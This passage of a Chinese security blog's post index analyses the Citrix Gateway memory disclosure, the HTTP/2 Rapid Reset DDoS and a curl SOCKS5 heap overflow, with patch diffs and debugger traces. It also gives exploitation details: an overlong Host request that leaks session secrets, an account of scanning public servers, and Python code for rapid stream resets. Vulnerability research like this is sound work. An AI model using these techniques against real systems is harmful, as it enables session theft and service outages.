由于squid为多进程架构，在子进程因为漏洞退出时，父进程会重新生成子进程处理代理请求，实际利用比较鸡肋，也就不难理解该漏洞没有CVE编号了。\n参考链接\nhttps://github.com/squid-cache/squid/security/advisories/GHSA-phqj-m8gv-cq4g\nhttps://datatracker.ietf.org/doc/html/rfc7616\nCreated at 2023-10-26T10:41:55+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-4966-citrix-gateway-info-disclosure/","title":"CVE-2023-4966 Citrix Gateway 信息泄露漏洞分析","tags":["漏洞分析"],"description":"","content":"基本信息 Citrix中存在信息泄露漏洞，由于越界读取，未经授权的攻击者可以利用该漏洞获取到存储在内存的密钥。\n该漏洞在八月下旬观察到在野利用。\n其他\n这个漏洞在10.19就已经分析完了，当时扫描了一下公网受影响服务器发现影响比较大，所以没有公开详情，在昨天国外安全研究员公开了PoC，所以现在才写分析文章。\n指纹 hunter\nweb.title=\u0026#34;Citrix Gateway\u0026#34; 影响版本 NetScaler ADC and NetScaler Gateway 14.1 \u0026lt; 14.1-8.50 NetScaler ADC and NetScaler Gateway 13.1 \u0026lt; 13.1-49.15 NetScaler ADC and NetScaler Gateway 13.0 \u0026lt; 13.0-92.19 NetScaler ADC 13.1-FIPS \u0026lt; 13.1-37.164 NetScaler ADC 12.1-FIPS \u0026lt; 12.1-55.300 NetScaler ADC 12.1-NDcPP \u0026lt; 12.1-55.300 环境搭建 参照\rCVE-2023-3519 Citrix Gateway RCE搭建\n14.1-4.42 192.168.52.100\n14.1-8.50 192.168.52.105\n13.1-49.15 192.168.52.95\n技术分析\u0026amp;调试 初步分析\n根据\r官方通告可知两个漏洞都是对内存的操作不当造成的。对应的CVSS3分别如下\nCVE-2023-4966 CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L CVE-2023-4967 CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H 综合可以知道如下信息： 利用漏洞无需权限、使用网络请求即可利用、均为内存型漏洞，应该跟[[CVE-2023-3519 Citrix Gateway RCE|CVE-2023-3519)类似，对用户输入没做校验，其中CVE-2023-4966 应该是实现了越界读取内存。 函数diff diff nsppe文件，分析各个函数修改的地方。\n在逐个分析各个函数之后，目光转到ns_aaa_oauth_send_openid_config函数。\n在补丁中 ns_aaa_oauth_send_openid_config中对snprintf的返回值做了判断，在修复之前直接将snpritf的返回值放到了ns_vpn_send_response中，修复之后先判断返回值是否大于1FFFF。\nsnprintf将格式化的数据，写入内存中，原型为int snprintf(char *str, int n, char * format [, argument, ...]);，其中n为要写入的字符串的最大长度，snprintf最多会给内存写入n-1个字符，最后一个字符使用'\\0'，当要格式化后的字符串大于n时，会在n-1处截断。但此时，snprintf会返回格式化字符串的长度，而不是写入内存的长度。\n向上追溯调用栈，ns_aaa_oauth_send_openid_config被 ns_vpn_process_unauthenticated_request调用，将 ns_vpn_process_unauthenticated_request 代码给AI分析调用到该函数的路径，可知调用路径为 /oauth/idp/.well-known/openid-configuration 此处猜测未修复版本中会使用snprintf的返回值作为长度参数进行读取。 curl请求该接口，可以看到响应中中会把我们请求的host放进去\n$ curl -i -s -k -X $\u0026#39;GET\u0026#39; -H $\u0026#39;Host: curl.test.site\u0026#39; -H $\u0026#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0\u0026#39; -H $\u0026#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\u0026#39; -H $\u0026#39;Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3\u0026#39; -H $\u0026#39;Accept-Encoding: gzip, deflate\u0026#39; -H $\u0026#39;Upgrade-Insecure-Requests: 1\u0026#39; -H $\u0026#39;Sec-Fetch-Dest: document\u0026#39; -H $\u0026#39;Sec-Fetch-Mode: navigate\u0026#39; -H $\u0026#39;Sec-Fetch-Site: none\u0026#39; -H $\u0026#39;Sec-Fetch-User: ?1\u0026#39; -H $\u0026#39;Te: trailers\u0026#39; -H $\u0026#39;Connection: close\u0026#39; -b $\u0026#39;NSC_TASS=/menu/neo\u0026#39; $\u0026#39;https://192.168.52.234/oauth/idp/.well-known/openid-configuration\u0026#39; HTTP/1.1 200 OK X-Content-Type-Options: nosniff X-XSS-Protection: 1; mode=block Content-Length: 717 Cache-control: no-cache, no-store, must-revalidate Pragma: no-cache Content-Type: application/json; charset=utf-8 X-Citrix-Application: Receiver for Web {\u0026#34;issuer\u0026#34;: \u0026#34;https://curl.test.site\u0026#34;, \u0026#34;authorization_endpoint\u0026#34;: \u0026#34;https://curl.test.site/oauth/idp/login\u0026#34;, \u0026#34;token_endpoint\u0026#34;: \u0026#34;https://curl.test.site/oaut h/idp/token\u0026#34;, \u0026#34;jwks_uri\u0026#34;: \u0026#34;https://curl.test.site/oauth/idp/certs\u0026#34;, \u0026#34;response_types_supported\u0026#34;: [\u0026#34;code\u0026#34;, \u0026#34;token\u0026#34;, \u0026#34;id_token\u0026#34;], \u0026#34;id_token_signing_alg_va lues_supported\u0026#34;: [\u0026#34;RS256\u0026#34;], \u0026#34;end_session_endpoint\u0026#34;: \u0026#34;https://curl.test.site/oauth/idp/logout\u0026#34;, \u0026#34;frontchannel_logout_supported\u0026#34;: true, \u0026#34;scopes_supported \u0026#34;: [\u0026#34;openid\u0026#34;, \u0026#34;ctxs_cc\u0026#34;], \u0026#34;claims_supported\u0026#34;: [\u0026#34;sub\u0026#34;, \u0026#34;iss\u0026#34;, \u0026#34;aud\u0026#34;, \u0026#34;exp\u0026#34;, \u0026#34;iat\u0026#34;, \u0026#34;auth_time\u0026#34;, \u0026#34;acr\u0026#34;, \u0026#34;amr\u0026#34;, \u0026#34;email\u0026#34;, \u0026#34;given_name\u0026#34;, \u0026#34;family_name\u0026#34;, \u0026#34;nic kname\u0026#34;], \u0026#34;userinfo_endpoint\u0026#34;: \u0026#34;https://curl.test.site/oauth/idp/userinfo\u0026#34;, \u0026#34;subject_types_supported\u0026#34;: [\u0026#34;public\u0026#34;]} 前面知道print_temp_rule大小为0x20000，返回值中共有6处重复了host，所以我们传入的host长度\u0026gt;21845(粗略估计)就可以触发溢出。再次请求，发现可以利用超长host读取到Citrix内存，实际测试发现host长度最多到24100左右。\n借助这个漏洞，写了一个nuclei模板对公网扫描，对八百个独立IP扫描，截止至10.20，仍然有大约15%未修复，且通过这个漏洞可以读取到内存中的secret，后续可以借助这个secret绕过身份验证，请求后端接口。\n这个接口也在oauth的配置中有提到\rhttps://support.citrix.com/article/CTX234873/how-to-deploy-netscaler-as-both-oauth-sp-and-idp\nns_aaa_oauthrp_send_openid_config函数类似，也snprintf的返回值做了判断。 调试\n关闭看门狗对nsppe进程发送的信号，而后直接在对应位置处下断点即可。\nroot@citrix3# nspf help Usage: \u0026#39;/netscaler/nspf ((\u0026lt;process_name\u0026gt; | \u0026lt;pid\u0026gt;) \u0026lt;action\u0026gt; | query)\u0026#39; where \u0026lt;process_name\u0026gt; is one of: NSPPE-00 aslearn awsconfig bgpd de imi isisd metricscollectomonuploadd nsaaad nsaggregatord nscfsyncd nsclfsyncd nsclusterd nsconfigd nscopo nsfsyncd nsgslbautosyncnslcd nslped nsm nsnetsvc nsrised nstraceaggregatnsumond ospf6d ospfd ptpd ripd ripngd snmpd syshealthd root@citrix3# /netscaler/nspf nsppe-00 pbmonitor 0 nspf NSPPE-00 pbmonitor 0 Removing pitboss monitor on process NSPPE-00 pid 37387 PoC\nhttps://github.com/Chestnuts4/POC/blob/master/nuclei_poc/CVE-2023-4966_citrix_info_disclose.yaml 实际利用\n通过漏洞可以读取到内存中的已登录会话的secret。\n小结 该漏洞整体分析、利用较为简单， 通过朴实无华的越界读取即可造成信息泄露，也无需进行内存布局。其实整体看nsppe，很多使用了snprintf的地方都对其返回值进行了判断，本次漏洞点没有对返回值做判断可能是因为开发时遗漏了。\n另外即使修复该漏洞之后，已被劫持的会话仍然有效，需要使用如下命令清除已登录的会话\nclar lb persistentSessions \u0026lt;vServer\u0026gt; 参考链接\nhttps://support.citrix.com/article/CTX579459/netscaler-adc-and-netscaler-gateway-security-bulletin-for-cve20234966-and-cve20234967\nhttps://support.citrix.com/article/CTX234873/how-to-deploy-netscaler-as-both-oauth-sp-and-idp\nhttps://www.citrix.com/downloads/citrix-adc/\nCreated at 2023-10-26T10:18:12+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-44487-http2-rapid-reset-ddos-attack/","title":"CVE-2023-44487 Http2 Rapid Reset DDOS Attack 分析","tags":["漏洞分析"],"description":"","content":"基本信息 利用 HTTP/2 的多路复用流功能，恶意攻击者可通过快速创建请求并立即重置请求，绕过最大并发流限制，导致服务器资源的过度消耗。\n影响范围 Go \u0026lt; 1.21.3 Go \u0026lt; 1.20.10\n11.0.0-M1 \u0026lt;= Apache Tomcat \u0026lt;= 11.0.0-M11 10.1.0-M1 \u0026lt;= Apache Tomcat \u0026lt;= 10.1.13 9.0.0-M1 \u0026lt;= Apache Tomcat \u0026lt;= 9.0.80 8.5.0 \u0026lt;= Apache Tomcat \u0026lt;= 8.5.9\ngrpc-go \u0026lt; 1.58.3 grpc-go \u0026lt; 1.57.1 grpc-go \u0026lt; 1.56.3\n环境搭建 使用go起一个http2 server。\npackage main import ( \u0026#34;fmt\u0026#34; \u0026#34;net/http\u0026#34; ) func main() { http.HandleFunc(\u0026#34;/\u0026#34;, func(w http.ResponseWriter, r *http.Request) { fmt.Println(r.Proto, r.URL) fmt.Fprint(w, \u0026#34;Hello World!\u0026#34;) }) http.ListenAndServeTLS(\u0026#34;:443\u0026#34;, \u0026#34;certs/cert.pem\u0026#34;, \u0026#34;certs/key.pem\u0026#34;, nil) } 使用curl测试是否成功 curl https://localhost -i -k --http2 -vvv。也可以使用nginx搭建一个http2服务器，配置很多博客都有就不写了。\n➜ http curl https://localhost -i -k --http2 -vvv * Trying 127.0.0.1:443... * Connected to localhost (127.0.0.1) port 443 (#0) * ALPN: offers h2,http/1.1 * TLSv1.3 (OUT), TLS handshake, Client hello (1): * TLSv1.3 (IN), TLS handshake, Server hello (2): * TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8): * TLSv1.3 (IN), TLS handshake, Certificate (11): * TLSv1.3 (IN), TLS handshake, CERT verify (15): * TLSv1.3 (IN), TLS handshake, Finished (20): * TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1): * TLSv1.3 (OUT), TLS handshake, Finished (20): * SSL connection using TLSv1.3 / TLS_AES_128_GCM_SHA256 * ALPN: server accepted h2 * Server certificate: * subject: C=XX; ST=StateName; L=CityName; O=CompanyName; OU=CompanySectionName; CN=CommonNameOrHostname * start date: Oct 12 08:46:51 2023 GMT * expire date: Oct 9 08:46:51 2033 GMT * issuer: C=XX; ST=StateName; L=CityName; O=CompanyName; OU=CompanySectionName; CN=CommonNameOrHostname * SSL certificate verify result: self-signed certificate (18), continuing anyway. * using HTTP/2 * h2h3 [:method: GET] * h2h3 [:path: /] * h2h3 [:scheme: https] * h2h3 [:authority: localhost] * h2h3 [user-agent: curl/7.88.1] * h2h3 [accept: */*] * Using Stream ID: 1 (easy handle 0x55566530a9e0) \u0026gt; GET / HTTP/2 \u0026gt; Host: localhost \u0026gt; user-agent: curl/7.88.1 \u0026gt; accept: */* \u0026gt; * TLSv1.3 (IN), TLS handshake, Newsession Ticket (4): \u0026lt; HTTP/2 200 HTTP/2 200 \u0026lt; content-type: text/plain; charset=utf-8 content-type: text/plain; charset=utf-8 \u0026lt; content-length: 12 content-length: 12 \u0026lt; date: Fri, 13 Oct 2023 06:52:06 GMT date: Fri, 13 Oct 2023 06:52:06 GMT \u0026lt; * Connection #0 to host localhost left intact Hello World!# 技术分析 其实这个在我看来某些方面看也不算漏洞，根据\rRFC9113规定，在HTTP2 setting阶段服务器可以声明支持的最大并发流，同时规定了客户端或服务端可以随时发送RST_STREAM以取消流，在收到RST_STREAM接收方不能在发送其他数据，除了优先级，协议并未规定客户端发送RST_STREAM的阈值，那么各大语言和软件实现的时候可能限制也有可能不限制RST_STREAM的阈值。这属于是各自实现方式的问题。 从协议层面讲，客户端直接RST_STREAM没有问题，典型的场景是用户在浏览器访问网站期间因为某些原因直接关闭了页面，此时浏览器需要向服务端发送RST_STREAM帧来取消流，可以帮助服务器节省资源。\nHTTP的几种DDOS HTTP 1.1 在HTTP 1.1中使用单个TCP连接顺序发送请求和响应，在前面的请求被响应之后才可以发送后续的请求，不能被多路复用，此时如果要对其进行DOS的话需要大量机器打开TCP连接顺序发送请求，消耗资源。 HTTP 2 HTTP2中实现了多路复用和并发，可以异步请求，客户端和服务端通过流ID来识别数据属于哪一个请求，这和HTTP1.1 相比，客户端可以启用大量并行请求，造成服务器负载上升，所以为了防护这种情况，在HTTP2初始化的时候，SETTINGS_MAX_CONCURRENT_STREAMS允许服务器向客户端通告最大允许的并发流，超过这个限制的流，服务器会返回RST_STREAM来拒绝这个流。HTTP2各个状态可以使用状态机表示，当服务器收到客户端发送的HEADERS帧时，会将流状态从空闲转换为打开，而后转为半关闭状态，只有流处于打开状态或半关闭状态才会被计入打开的流数量。 来源:\rhttps://blog.cloudflare.com/technical-breakdown-http2-rapid-reset-ddos-attack/\n上面提到，只有打开和半关闭的流才会计入流数量，影响并发限制，当客户端发送RST_STREAM时，流状态会从半关闭状态转入关闭状态，即释放了一个流，此时客户端可以立即发起一个新请求占用释放的流，这就是CVE-2023-44487的关键。恶意客户端可以在打开大量流之后立即发送RST_STREAM帧，这样在请求到达服务器，而服务器暂未准备好响应时，这个请求的RST_STREAM帧随机到达服务器，服务器取消这个流并释放一个并发流。\n图片来源：\rhttps://cloud.google.com/blog/products/identity-security/how-it-works-the-novel-http2-rapid-reset-ddos-attack\n在标准HTTP2 DDOS的时候，恶意客户端可以打开服务器允许的最大限制的流数量而后发送请求，服务器依次响应，循环这个过程，消耗服务器资源。 而变种HTTP2 DDOS中，攻击者可以利用CVE-2023-44487 绕过这个限制，滥用HTTP 2的取消请求，快速重置无限数量的流，根据RFC 服务器收到RST_STREAM帧之后不需要返回数据，在现实实现时，服务器收到了客户端的HRADERS请求，在收到RST_STREAM之前，需要解析客户端请求的资源，在收到RST_STREAM之后需要释放资源，所以在客户端只需要付出带宽的代价下，服务器会付出比这个高得多的代价，导致高效率的DDOS。\n补丁分析\n在go中支持HTTP2协议的解析，所以go也受这个漏洞影响，下面是go修复漏洞的补丁diff 对比go修复这个漏洞的补丁，主要修复逻辑在http2#scheduleHandler，其中advMaxStreams默认为250，当在处理的流超过了250，则比较未开始处理的流数量是否大于1000，大于则报错。 可以看出来补丁主要是限制了同时并发流的数量。该方法在processHeaders中调用，可以看出来，在原先逻辑中，会直接处理客户端请求，而在补丁中会判断当前流的数量，在范围内才会调用 go sc.runHandler(rw, req, handler)处理请求\ntype unstartedHandler struct { streamID uint32 rw *responseWriter req *http.Request handler func(http.ResponseWriter, *http.Request) } // scheduleHandler starts a handler goroutine, // or schedules one to start as soon as an existing handler finishes. func (sc *serverConn) scheduleHandler(streamID uint32, rw *responseWriter, req *http.Request, handler func(http.ResponseWriter, *http.Request)) error { sc.serveG.check() maxHandlers := sc.advMaxStreams if sc.curHandlers \u0026lt; maxHandlers { sc.curHandlers++ go sc.runHandler(rw, req, handler) return nil } if len(sc.unstartedHandlers) \u0026gt; int(4*sc.advMaxStreams) { return sc.countError(\u0026#34;too_many_early_resets\u0026#34;, ConnectionError(ErrCodeEnhanceYourCalm)) } sc.unstartedHandlers = append(sc.unstartedHandlers, unstartedHandler{ streamID: streamID, rw: rw, req: req, handler: handler, }) return nil } func (sc *serverConn) handlerDone() { sc.serveG.check() sc.curHandlers-- i := 0 maxHandlers := sc.advMaxStreams for ; i \u0026lt; len(sc.unstartedHandlers); i++ { u := sc.unstartedHandlers[i] if sc.streams[u.streamID] == nil { // This stream was reset before its goroutine had a chance to start. continue } if sc.curHandlers \u0026gt;= maxHandlers { break } sc.curHandlers++ go sc.runHandler(u.rw, u.req, u.handler) sc.unstartedHandlers[i] = unstartedHandler{} // don\u0026#39;t retain references } sc.unstartedHandlers = sc.unstartedHandlers[i:] if len(sc.unstartedHandlers) == 0 { sc.unstartedHandlers = nil } } nginx针对这个漏洞也出了一份\r官方通告指出默认配置不受此漏洞影响，即 keepalive_requests 1000;http2_max_concurrent_streams 128;这个配置也可以对应上go补丁中的250最大stream和1000个队列。\n虽然默认配置不受该漏洞影响，但nginx也针对这个漏洞进行了修复，commit为\r6ceef192e7af1c507826ac38a2d43f08bf265fb9，在该commit中也是统计并限制了并发流数量，超过某个阈值则返回错误。\n开发PoC\n在GitHub的\rPoC经过实际测试，没有达到谷歌和CF所说的在发HTTP2请求之后立马重置，也就是无效PoC。根据代码逻辑，在发送HTTP2 header之后PoC接着尝试接收服务器返回的数据，如果服务端返回了StreamReset则打印已成功取消，如果是RequestReceived则调用conn.reset_stream，但实际利用应该是发送HTTP2 header之后立马发送RST_Stream，而后打开一个新流重复如上过程。 实际测试发现，conn.reset_stream(event.stream_id, error_code=ErrorCodes.CANCEL)永远不会被调用到，也就是该PoC会执行完整的HTTP2请求，完事之后服务端返回RST_STREAM，打印已取消，这明显是错误的。\nstream_id = conn.get_next_available_stream_id() conn.send_headers( stream_id, [(\u0026#39;:method\u0026#39;, \u0026#39;GET\u0026#39;), (\u0026#39;:authority\u0026#39;, url), (\u0026#39;:path\u0026#39;, \u0026#39;/\u0026#39;), (\u0026#39;:scheme\u0026#39;, \u0026#39;https\u0026#39;)], ) sock.sendall(conn.data_to_send()) # Read some data while True: data = sock.recv(65535) if not data: break events = conn.receive_data(data) for event in events: if isinstance(event, RequestReceived): # Cancel the stream with error code for CANCEL conn.reset_stream(event.stream_id, error_code=ErrorCodes.CANCEL) elif isinstance(event, StreamReset): print(f\u0026#34;Stream {event.stream_id} cancelled.\u0026#34;) 所以我们只需要将接收数据的逻辑去掉，改为发送headers之后直接发送reset即可，PoC晚些时候会上传到\rGitHub上。 利用效果如下，单个进程单个线程可以使服务CPU占用20%\n当然这个漏洞PoC也适合使用go写，我这边go写的并发有点问题，不如python版本稳定。\n抓包分析\n运行PoC抓包，解密，wireshark摘要如下：\n在本次环境中，服务器通告的最大并发流为250。在下面的数据包中，客户端先发送HEADERS请求，而后发送RST_STREAM请求，循环往复。\n通过这种办法客户端不用等待服务器响应，发送速率只受自己带宽限制，从而并非服务器在HTTP2协议初始化时声明的最大并发流限制。\n小结 HTTP2 DOS原理较为简单，利用RFC所规定的协议特性，本质上属于滥用，而CloudFlare对此的应对策略是当客户端重置次数超过某个阈值则认为是恶意客户端，关闭该连接。\n由于nginx默认配置不受影响，所以受此漏洞影响的大部分是go 或者java启动的HTTP服务，同时如果使用nginx反代后端服务，即使后端服务支持HTTP2，nginx也会将请求降级到HTTP 1.1。\n可预见的将来，此次这种漏洞的出现不会是最后一次，hope the internet will become more and more secure.\n参考链接\nhttps://datatracker.ietf.org/doc/html/rfc9113#name-stream-identifiers\nhttps://cloud.google.com/blog/products/identity-security/how-it-works-the-novel-http2-rapid-reset-ddos-attack\nhttps://blog.cloudflare.com/technical-breakdown-http2-rapid-reset-ddos-attack/\nhttps://www.nginx.com/blog/http-2-rapid-reset-attack-impacting-f5-nginx-products/\nCreated at 2023-10-13T15:11:25+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-38545-curl-heap-overflow/","title":"CVE-2023-38545 Curl 堆溢出漏洞分析","tags":["漏洞分析"],"description":"","content":"基本信息 在libcurl中存在堆溢出漏洞，当libcurl通过socks5代理发送请求时，如果hostname大于255则会在本地解析，但由于状态机错误导致没有按照预期解析，而是把主机名拷贝到缓冲区中，攻击者可以通过构造超长主机名触发堆溢出。\n影响版本 7.69.0 \u0026lt;= libcurl \u0026lt;= 8.3.4\n环境搭建 sudo apt-get build-dep curl autoreconf ./configure --with-openssl --prefix=$HOME/code/c/curl-8.3.0/build --enable-debug make -j 16 make install 技术分析\u0026amp;调试 补丁 漏洞在\rfb4415d8aee6c1045be932a34fe6107c2f5ed147修复，修复代码如下 从修复代码中可以看出两个区别\n当socks5_resolve_local=false and hostname_len \u0026gt;255 时返回CURLPX_LONG_HOSTNAME错误码，而原先逻辑为将socks5_resolve_local设为true 将hostname_len转为unsigned char后赋值给socksreq[len++] 修复代码位于do_SOCKS5函数，该函数由connect_SOCKS函数调用 static CURLcode connect_SOCKS(struct Curl_cfilter *cf, struct socks_state *sxstate, struct Curl_easy *data) { ...... switch(conn-\u0026gt;socks_proxy.proxytype) { case CURLPROXY_SOCKS5: case CURLPROXY_SOCKS5_HOSTNAME: pxresult = do_SOCKS5(cf, sxstate, data); break; 向上追溯connect_SOCKS由socks_proxy_cf_connect调用，socks_proxy_cf_connect被存储在了一个结构体中\nstatic CURLcode socks_proxy_cf_connect(struct Curl_cfilter *cf, struct Curl_easy *data, bool blocking, bool *done) { CURLcode result; struct connectdata *conn = cf-\u0026gt;conn; int sockindex = cf-\u0026gt;sockindex; struct socks_state *sx = cf-\u0026gt;ctx; if(cf-\u0026gt;connected) { *done = TRUE; return CURLE_OK; } result = cf-\u0026gt;next-\u0026gt;cft-\u0026gt;do_connect(cf-\u0026gt;next, data, blocking, done); if(result || !*done) return result; if(!sx) { sx = calloc(sizeof(*sx), 1); if(!sx) return CURLE_OUT_OF_MEMORY; cf-\u0026gt;ctx = sx; } if(sx-\u0026gt;state == CONNECT_INIT) { /* for the secondary socket (FTP), use the \u0026#34;connect to host\u0026#34; * but ignore the \u0026#34;connect to port\u0026#34; (use the secondary port) */ sxstate(sx, data, CONNECT_SOCKS_INIT); sx-\u0026gt;hostname = conn-\u0026gt;bits.httpproxy ? conn-\u0026gt;http_proxy.host.name : conn-\u0026gt;bits.conn_to_host ? conn-\u0026gt;conn_to_host.name : sockindex == SECONDARYSOCKET ? conn-\u0026gt;secondaryhostname : conn-\u0026gt;host.name; sx-\u0026gt;remote_port = conn-\u0026gt;bits.httpproxy ? (int)conn-\u0026gt;http_proxy.port : sockindex == SECONDARYSOCKET ? conn-\u0026gt;secondary_port : conn-\u0026gt;bits.conn_to_port ? conn-\u0026gt;conn_to_port : conn-\u0026gt;remote_port; sx-\u0026gt;proxy_user = conn-\u0026gt;socks_proxy.user; sx-\u0026gt;proxy_password = conn-\u0026gt;socks_proxy.passwd; } result = connect_SOCKS(cf, sx, data); struct Curl_cftype Curl_cft_socks_proxy = { \u0026#34;SOCKS-PROXYY\u0026#34;, CF_TYPE_IP_CONNECT, 0, socks_proxy_cf_destroy, socks_proxy_cf_connect, socks_proxy_cf_close, socks_cf_get_host, socks_cf_get_select_socks, Curl_cf_def_data_pending, Curl_cf_def_send, Curl_cf_def_recv, Curl_cf_def_cntrl, Curl_cf_def_conn_is_alive, Curl_cf_def_conn_keep_alive, Curl_cf_def_query, }; 技术分析和动态调试 本次修复的函数do_SOCKS5实现了处理SOCKS5连接中的各个状态的代码，这个函数实现了一个状态机，状态机根据在socks连接中的不同状态进行不同操作，第一次调用do_SOCKS5时，socks5_resolve_local被初始化为 false，同时状态机状态为CONNECT_SOCKS_INIT\nbool socks5_resolve_local = (conn-\u0026gt;socks_proxy.proxytype == CURLPROXY_SOCKS5) ? TRUE : FALSE; gef➤ p socks5_resolve_local $5 = 0x0 函数进入CONNECT_SOCKS_INIT分支，由于传递给curl的主机名超长，大于255，进入if中，socks5_resolve_local被赋值为true，代表此时应该使用本地解析\nswitch(sx-\u0026gt;state) { case CONNECT_SOCKS_INIT: if(conn-\u0026gt;bits.httpproxy) infof(data, \u0026#34;SOCKS5: connecting to HTTP proxy %s port %d\u0026#34;, sx-\u0026gt;hostname, sx-\u0026gt;remote_port); /* RFC1928 chapter 5 specifies max 255 chars for domain name in packet */ if(!socks5_resolve_local \u0026amp;\u0026amp; hostname_len \u0026gt; 255) { infof(data, \u0026#34;SOCKS5: server resolving disabled for hostnames of \u0026#34; \u0026#34;length \u0026gt; 255 [actual len=%zu]\u0026#34;, hostname_len); socks5_resolve_local = TRUE; } 此时调用栈如下：\n────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── source:socks.c+595 ──── 590 infof(data, \u0026#34;SOCKS5: server resolving disabled for hostnames of \u0026#34; 591 \u0026#34;length \u0026gt; 255 [actual len=%zu]\u0026#34;, hostname_len); 592 socks5_resolve_local = TRUE; 593 } 594 // auth=0x5 → 595 if(auth \u0026amp; ~(CURLAUTH_BASIC | CURLAUTH_GSSAPI)) 596 infof(data, 597 \u0026#34;warning: unsupported value passed to CURLOPT_SOCKS5_AUTH: %u\u0026#34;, 598 auth); 599 if(!(auth \u0026amp; CURLAUTH_BASIC)) 600 /* disable username/password auth */ ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ──── [#0] Id 1, Name: \u0026#34;curl\u0026#34;, stopped 0x7ffff7f4906d in do_SOCKS5 (), reason: SINGLE STEP ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ──── gef➤ p socks5_resolve_local $6 = 0x1 gef➤ bt #0 do_SOCKS5 (cf=0x5555555e6428, sx=0x5555555e6468, data=0x5555555e6ef8) at socks.c:573 #1 0x00007ffff7f4a137 in connect_SOCKS (cf=0x5555555e6428, sxstate=0x5555555e6468, data=0x5555555e6ef8) at socks.c:1067 #2 0x00007ffff7f4a3f1 in socks_proxy_cf_connect (cf=0x5555555e6428, data=0x5555555e6ef8, blocking=0x0, done=0x7fffffffb667) at socks.c:1149 #3 0x00007ffff7ed6635 in Curl_conn_cf_connect (cf=0x5555555e6428, data=0x5555555e6ef8, blocking=0x0, done=0x7fffffffb667) at cfilters.c:296 #4 0x00007ffff7edaa4d in cf_setup_connect (cf=0x5555555e6348, data=0x5555555e6ef8, blocking=0x0, done=0x7fffffffb667) at connect.c:1201 #5 0x00007ffff7ed68a1 in Curl_conn_connect (data=0x5555555e6ef8, sockindex=0x0, blocking=0x0, done=0x7fffffffb667) at cfilters.c:351 #6 0x00007ffff7f276b7 in multi_runsingle (multi=0x5555555dd868, nowp=0x7fffffffb6f0, data=0x5555555e6ef8) at multi.c:2106 #7 0x00007ffff7f28d94 in curl_multi_perform (multi=0x5555555dd868, running_handles=0x7fffffffb754) at multi.c:2742 #8 0x00007ffff7eeb1e6 in easy_transfer (multi=0x5555555dd868) at easy.c:682 #9 0x00007ffff7eeb3d4 in easy_perform (data=0x5555555e6ef8, events=0x0) at easy.c:772 #10 0x00007ffff7eeb40c in curl_easy_perform (data=0x5555555e6ef8) at easy.c:791 #11 0x000055555557a1f3 in serial_transfers (global=0x7fffffffb900, share=0x5555555d9f08) at tool_operate.c:2479 #12 0x000055555557a7c1 in run_all_transfers (global=0x7fffffffb900, share=0x5555555d9f08, result=CURLE_OK) at tool_operate.c:2670 #13 0x000055555557ab6c in operate (global=0x7fffffffb900, argc=0x7, argv=0x7fffffffba98) at tool_operate.c:2786 #14 0x00005555555710f8 in main (argc=0x7, argv=0x7fffffffba98) at tool_main.c:274 gef➤ 在这状态下，curl会初始化一些SOCKS请求body并将其发送给socks server，而后将状态转为 CONNECT_SOCKS_READ_INIT并跳转到对应代码处。\nidx = 0; socksreq[idx++] = 5; /* version */ idx++; /* number of authentication methods */ socksreq[idx++] = 0; /* no authentication */ if(allow_gssapi) socksreq[idx++] = 1; /* GSS-API */ if(sx-\u0026gt;proxy_user) socksreq[idx++] = 2; /* username/password */ /* write the number of authentication methods */ socksreq[1] = (unsigned char) (idx - 2); sx-\u0026gt;outp = socksreq; sx-\u0026gt;outstanding = idx; presult = socks_state_send(cf, sx, data, CURLPX_SEND_CONNECT, ...... sxstate(sx, data, CONNECT_SOCKS_READ); goto CONNECT_SOCKS_READ_INIT; 在状态 CONNECT_SOCKS_READ_INIT中，会赋值结构体成员而后将状态转为 CONNECT_SOCKS_READ，curl会尝试从TCP连接中读取数据\ncase CONNECT_SOCKS_READ_INIT: sx-\u0026gt;outstanding = 2; /* expect two bytes */ sx-\u0026gt;outp = socksreq; /* store it here */ /* FALLTHROUGH */ case CONNECT_SOCKS_READ: presult = socks_state_recv(cf, sx, data, CURLPX_RECV_CONNECT, \u0026#34;initial SOCKS5 response\u0026#34;); if(CURLPX_OK != presult) return presult; else if(sx-\u0026gt;outstanding) { /* remain in reading state */ return CURLPX_OK; } 读取数据时，其调用栈如下\ngef➤ bt #0 cf_socket_recv (cf=0x5555555e6a28, data=0x5555555e6ef8, buf=0x5555555ddb48 \u0026#34;\\005\\001\u0026#34;, len=0x2, err=0x7fffffffb3a4) at cf-socket.c:1352 #1 0x00007ffff7ed5d95 in Curl_cf_def_recv (cf=0x5555555e63e8, data=0x5555555e6ef8, buf=0x5555555ddb48 \u0026#34;\\005\\001\u0026#34;, len=0x2, err=0x7fffffffb3a4) at cfilters.c:100 #2 0x00007ffff7ed6762 in Curl_conn_cf_recv (cf=0x5555555e63e8, data=0x5555555e6ef8, buf=0x5555555ddb48 \u0026#34;\\005\\001\u0026#34;, len=0x2, err=0x7fffffffb3a4) at cfilters.c:328 #3 0x00007ffff7f4839a in socks_state_recv (cf=0x5555555e6428, sx=0x5555555e6468, data=0x5555555e6ef8, failcode=CURLPX_RECV_CONNECT, description=0x7ffff7f82254 \u0026#34;initial SOCKS5 response\u0026#34;) at socks.c:241 #4 0x00007ffff7f49274 in do_SOCKS5 (cf=0x5555555e6428, sx=0x5555555e6468, data=0x5555555e6ef8) at socks.c:646 #5 0x00007ffff7f4a137 in connect_SOCKS (cf=0x5555555e6428, sxstate=0x5555555e6468, data=0x5555555e6ef8) at 